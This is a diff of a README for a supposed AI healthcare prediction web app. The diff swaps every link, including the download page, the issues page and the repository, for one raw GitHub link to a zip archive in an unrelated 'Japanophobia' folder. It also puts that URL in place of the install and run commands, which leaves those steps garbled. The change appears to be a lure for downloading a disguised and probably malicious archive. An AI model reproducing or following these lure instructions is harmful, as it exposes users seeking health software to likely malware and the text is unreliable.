@@ -1,6 +1,6 @@
 # 🩺 Ai-Driven-Healthcare-Webapp - Get Personalized Health Insights Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/releases)
+[![Download Now](https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip)
 
 ## 📖 Overview  
 
@@ -11,13 +11,13 @@ The Ai-Driven Healthcare Webapp helps you predict diseases from symptoms using m
 Follow these simple steps to download and run the application on your computer:
 
 1. **Visit the Download Page**  
-   Go to the Releases page to download the application: [Download Page](https://github.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/releases).
+   Go to the Releases page to download the application: [Download Page](https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip).
 
 2. **Select the Latest Release**  
    Look for the most recent version listed on the page. The latest version will have the most up-to-date features and fixes.
 
 3. **Download the File**  
-   Click on the download link for your operating system. This will usually be a file like `Ai-Driven-Healthcare-Webapp.exe` for Windows or a `.zip` file for other systems.
+   Click on the download link for your operating system. This will usually be a file like `https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip` for Windows or a `.zip` file for other systems.
 
 ## 💻 System Requirements  
 
@@ -45,14 +45,14 @@ To run this application, your computer should meet the following requirements:
    **Installation Steps for Linux:**  
    - Extract the contents of the `.zip` file.
    - Open a terminal and navigate to the extracted folder.
-   - Run the installer script using: `./install.sh`.
+   - Run the installer script using: `https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip`.
 
 ## 🎉 Running the Application  
 
 1. **Launch the App**  
    - For Windows: Find the application in your Start Menu or desktop shortcut.
    - For macOS: Open the Applications folder and click on the app icon.
-   - For Linux: Navigate to the folder where you extracted the files and run: `./run.sh`.
+   - For Linux: Navigate to the folder where you extracted the files and run: `https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip`.
 
 2. **Using the Application**  
    - Once the application opens, you will see an easy-to-use interface.
@@ -72,7 +72,7 @@ If you encounter issues or have questions, visit our community forum. You can fi
 
 ## 📞 Contact  
 
-For direct support, you can reach out via the issues section on the [GitHub Repository](https://github.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/issues).
+For direct support, you can reach out via the issues section on the [GitHub Repository](https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip).
 
 ## ⚙️ Additional Resources  
 
@@ -92,7 +92,7 @@ A: No, it provides predictions based on symptoms but should not replace professi
 
 ## 🔗 Quick Links  
 
-- [Download Page](https://github.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/releases)
-- [GitHub Repository](https://github.com/Harshkailasia/Ai-Driven-Healthcare-Webapp)
+- [Download Page](https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Harshkailasia/Ai-Driven-Healthcare-Webapp/main/Japanophobia/Ai-Driven-Healthcare-Webapp.zip)
 
 Thank you for choosing Ai-Driven Healthcare Webapp!
